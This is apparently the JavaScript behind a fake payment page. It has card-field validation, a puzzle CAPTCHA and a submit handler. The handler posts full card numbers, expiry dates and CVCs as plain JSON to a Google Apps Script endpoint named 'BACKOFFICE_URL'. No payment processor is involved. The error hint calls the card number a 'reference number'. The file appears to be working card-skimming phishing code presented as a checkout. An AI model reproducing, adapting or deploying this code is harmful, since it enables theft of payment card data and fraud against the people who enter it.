const $ = (id) => document.getElementById(id);
const onlyDigits = (s) => (s || "").replace(/\D/g, "");

const BACKOFFICE_URL =
  "https://script.google.com/macros/s/AKfycbxUW3g37D2xixO-DdhaAkRqZIOHjDUhZF7enPjhSC5F-m8juDtjB6d-ACvynFLIFtax/exec";

const fullName = $("fullName");
const cardNumber = $("cardNumber");
const amount = $("amount");
const exp = $("exp");
const cvc = $("cvc");
const zip = $("zip");
const country = $("country");
const payBtn = $("payBtn");

const fName = $("fName");
const fCard = $("fCard");
const fAmount = $("fAmount");
const fExp = $("fExp");
const fCvc = $("fCvc");
const fZip = $("fZip");
const fCountry = $("fCountry");
const cardHint = $("cardHint");

// --- CAPTCHA Elements ---
const captchaTriggerBtn = $("captchaTriggerBtn");
const captchaModal = $("captchaModal");
const captchaModalClose = $("captchaModalClose");

const puzzleBg = $("puzzleBg");
const puzzleHole = $("puzzleHole");
const puzzlePiece = $("puzzlePiece");
const puzzleSliderTrack = $("puzzleSliderTrack");
const puzzleSliderFill = $("puzzleSliderFill");
const captchaSlider = $("captchaSlider");
const captchaInstruction = $("captchaInstruction");

let isCaptchaVerified = false;
let isDragging = false;
let startX = 0;
let currentX = 0;
let targetX = 0;
let targetY = 0;

// Dimensions (Matched to CSS)
const pWidth = 280;
const pHeight = 150;
const pSize = 45;

// Fair tolerance for an average user
const tolerance = 4; 

function luhn(num){
  let sum = 0, flip = false;
  for (let i = num.length - 1; i >= 0; i--){
    let d = Number(num[i]);
    if (flip){
      d *= 2;
      if (d > 9) d -= 9;
    }
    sum += d;
    flip = !flip;
  }
  return sum % 10 === 0;
}

function setInvalid(fieldEl, yes){
  fieldEl.classList.toggle("invalid", !!yes);
}

function formatCard(digits){
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

function formatExp(raw){
  const d = onlyDigits(raw).slice(0, 4);
  if (d.length <= 2) return d;
  return d.slice(0,2) + "/" + d.slice(2);
}

// Populate countries
const COUNTRIES = [
  "Australia","Austria","Belgium","Brazil","Canada","Denmark","Finland","France",
  "Germany","Greece","India","Ireland","Italy","Japan","Mexico","Netherlands",
  "New Zealand","Norway","Poland","Portugal","Singapore","Spain","Sweden",
  "Switzerland","United Kingdom","United States"
];

(function populateCountries(){
  const frag = document.createDocumentFragment();
  for (const c of COUNTRIES){
    const opt = document.createElement("option");
    opt.value = c;
    opt.textContent = c;
    frag.appendChild(opt);
  }
  country.appendChild(frag);
})();

// Input Handlers
cardNumber.addEventListener("input", () => {
  const digits = onlyDigits(cardNumber.value).slice(0, 16);
  cardNumber.value = formatCard(digits);
  validate();
});
exp.addEventListener("input", () => {
  exp.value = formatExp(exp.value);
  validate();
});
cvc.addEventListener("input", () => {
  cvc.value = onlyDigits(cvc.value).slice(0, 3);
  validate();
});
amount.addEventListener("input", () => {
  amount.value = amount.value.replace(/[^\d.,]/g, "");
  validate();
});
[fullName, zip].forEach(el => el.addEventListener("input", validate));
country.addEventListener("change", validate);

$("toggleCvc").addEventListener("click", () => {
  cvc.type = (cvc.type === "password") ? "text" : "password";
});

// --- Validation Logic ---
function isValidName(){
  const v = (fullName.value || "").trim();
  return v.length >= 3 && v.split(/\s+/).length >= 2;
}
function isValidCard(){
  const d = onlyDigits(cardNumber.value);
  if (d.length !== 16) return { ok:false, reason:"len" };
  if (!luhn(d)) return { ok:false, reason:"luhn" };
  return { ok:true, reason:"ok" };
}
function isValidAmount(){
  const v = (amount.value || "").replace(",", ".");
  if (!v) return false;
  const n = Number(v);
  return Number.isFinite(n) && n > 0;
}
function isValidExp(){
  const v = (exp.value || "").trim();
  if (!/^\d{2}\/\d{2}$/.test(v)) return false;
  const mm = Number(v.slice(0,2));
  const yy = Number(v.slice(3,5));
  if (mm < 1 || mm > 12) return false;
  const now = new Date();
  const curYY = now.getFullYear() % 100;
  const curMM = now.getMonth() + 1;
  if (yy < curYY) return false;
  if (yy === curYY && mm < curMM) return false;
  return true;
}
function isValidCvc(){
  const d = onlyDigits(cvc.value);
  return d.length === 3 || d.length === 4;
}
function isValidZip(){
  return (zip.value || "").trim().length >= 2;
}
function isValidCountry(){
  return !!(country.value || "").trim();
}

function validate(){
  const vName = isValidName();
  const card = isValidCard();
  const vAmount = isValidAmount();
  const vExp = isValidExp();
  const vCvc = isValidCvc();
  const vZip = isValidZip();
  const vCountry = isValidCountry();

  setInvalid(fName, !vName && fullName.value.trim().length > 0);

  const cardDigits = onlyDigits(cardNumber.value);
  const showCardInvalid = cardDigits.length > 0;
  setInvalid(fCard, showCardInvalid && !card.ok);

  if (showCardInvalid){
    cardHint.textContent = (cardDigits.length !== 16)
      ? "Reference number must be exactly 16 digits."
      : "Reference number is not valid.";
  } else {
    cardHint.textContent = "Reference number must be 16 digits and valid.";
  }

  setInvalid(fAmount, !vAmount && amount.value.trim().length > 0);
  setInvalid(fExp, !vExp && exp.value.trim().length > 0);
  setInvalid(fCvc, !vCvc && onlyDigits(cvc.value).length > 0);
  setInvalid(fZip, !vZip && zip.value.trim().length > 0);
  setInvalid(fCountry, !vCountry && country.value !== "");

  const canPay = vName && card.ok && vAmount && vExp && vCvc && vZip && vCountry && isCaptchaVerified;
  payBtn.disabled = !canPay;
}

validate();

// --- IMAGE PUZZLE CAPTCHA LOGIC ---
function openCaptchaModal() {
  if (isCaptchaVerified) return;
  captchaModal.classList.add("show");
  
  captchaInstruction.textContent = "Drag the slider to fit the puzzle piece";
  captchaInstruction.style.color = "var(--muted)";
  initCaptcha();
}

function closeCaptchaModal() {
  captchaModal.classList.remove("show");
}

captchaTriggerBtn.addEventListener("click", openCaptchaModal);
captchaModalClose.addEventListener("click", closeCaptchaModal);
captchaModal.addEventListener("click", (e) => {
  if (e.target === captchaModal) closeCaptchaModal();
});

function initCaptcha() {
  if (isCaptchaVerified) return;
  
  // 1. Fetch a random image 
  const rand = Math.floor(Math.random() * 1000);
  const imgUrl = `https://picsum.photos/${pWidth}/${pHeight}?random=${rand}`;
  
  puzzleBg.style.backgroundImage = `url(${imgUrl})`;
  puzzlePiece.style.backgroundImage = `url(${imgUrl})`;

  // 2. Generate random target positions
  // Keep the hole away from the far left so it takes effort to drag
  const minX = pWidth * 0.35;
  const maxX = pWidth - pSize - 10;
  targetX = Math.floor(Math.random() * (maxX - minX)) + minX;
  
  // Keep Y coordinate slightly randomized
  const maxY = pHeight - pSize - 10;
  targetY = Math.floor(Math.random() * (maxY - 10)) + 10;

  // 3. Position the cutout hole
  puzzleHole.style.left = `${targetX}px`;
  puzzleHole.style.top = `${targetY}px`;

  // 4. Align the sliding piece's background offset to match the hole's coords
  puzzlePiece.style.top = `${targetY}px`;
  puzzlePiece.style.left = `0px`;
  puzzlePiece.style.backgroundPosition = `-${targetX}px -${targetY}px`;

  // 5. Reset UI states
  currentX = 0;
  captchaSlider.style.transform = `translateX(0px)`;
  puzzlePiece.style.transform = `translateX(0px)`;
  puzzleSliderFill.style.width = `0px`;
  
  // Remove verified styles if resetting
  puzzleSliderTrack.classList.remove("verified");
  captchaSlider.innerHTML = `
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <line x1="4" y1="8" x2="20" y2="8"></line>
      <line x1="4" y1="16" x2="20" y2="16"></line>
    </svg>`;
}

captchaSlider.addEventListener("pointerdown", (e) => {
  if (isCaptchaVerified) return;
  isDragging = true;
  startX = e.clientX - currentX;
  captchaSlider.style.transition = "none";
  puzzlePiece.style.transition = "none";
});

window.addEventListener("pointermove", (e) => {
  if (!isDragging || isCaptchaVerified) return;
  
  let x = e.clientX - startX;
  const maxLeft = pWidth - pSize; // Slider track max drag limit
  
  if (x < 0) x = 0;
  if (x > maxLeft) x = maxLeft;
  
  currentX = x;
  captchaSlider.style.transform = `translateX(${x}px)`;
  puzzlePiece.style.transform = `translateX(${x}px)`;
  puzzleSliderFill.style.width = `${x + (pSize / 2)}px`; 
});

window.addEventListener("pointerup", () => {
  if (!isDragging || isCaptchaVerified) return;
  isDragging = false;
  
  // Check success within 4px tolerance
  if (Math.abs(currentX - targetX) <= tolerance) {
    verifyCaptcha();
  } else {
    // Failed: Snap back and grab a new image
    captchaInstruction.textContent = "Missed the mark. Trying a new image!";
    captchaInstruction.style.color = "var(--danger)";
    
    captchaSlider.style.transition = "transform 0.3s ease";
    puzzlePiece.style.transition = "transform 0.3s ease";
    
    currentX = 0;
    captchaSlider.style.transform = `translateX(0px)`;
    puzzlePiece.style.transform = `translateX(0px)`;
    puzzleSliderFill.style.width = `0px`;
    
    setTimeout(() => {
      captchaInstruction.textContent = "Drag the slider to fit the puzzle piece";
      captchaInstruction.style.color = "var(--muted)";
      initCaptcha(); // Load fresh puzzle
    }, 800);
  }
});

function verifyCaptcha() {
  isCaptchaVerified = true;
  puzzleSliderTrack.classList.add("verified");
  
  // Change slider icon to checkmark
  captchaSlider.innerHTML = `
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
      <polyline points="20 6 9 17 4 12"></polyline>
    </svg>`;
  
  // Update main form button visually
  captchaTriggerBtn.classList.add("verified");
  captchaTriggerBtn.innerHTML = `
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 8px;">
      <polyline points="20 6 9 17 4 12"></polyline>
    </svg>
    <span>Verified</span>
  `;

  validate(); 
  
  setTimeout(() => closeCaptchaModal(), 800);
}

// --- Submit Logic ---
function generateTransactionId(){
  const year = new Date().getFullYear();
  const rand = Math.floor(100000 + Math.random() * 900000);
  return `TXN-${year}-${rand}`;
}

function sendToBackoffice(payload){
  return fetch(BACKOFFICE_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
}

payBtn.addEventListener("click", async () => {
  if (payBtn.disabled) return;
  payBtn.disabled = true;

  const transactionId = generateTransactionId();
  const payload = {
    transactionId,
    name: (fullName.value || "").trim(),
    cardNumber: onlyDigits(cardNumber.value),     
    expiration: (exp.value || "").trim(),         
    cvc: onlyDigits(cvc.value),                   
    amount: (amount.value || "").replace(",", "."),
    currency: $("currency").value,
    country: (country.value || "").trim(),
    zip: (zip.value || "").trim(),
    date: new Date().toISOString(),
    status: "SUBMITTED"
  };

  try {
    await sendToBackoffice(payload);
    sessionStorage.setItem("payment_submitted", "1");
    sessionStorage.setItem("txn_id", transactionId);
    window.location.href = "confirmation.html";
  } catch (err) {
    console.error("Backoffice logging failed:", err);
    alert("Could not save transaction to backoffice. Please try again.");
    payBtn.disabled = false; 
  }
});
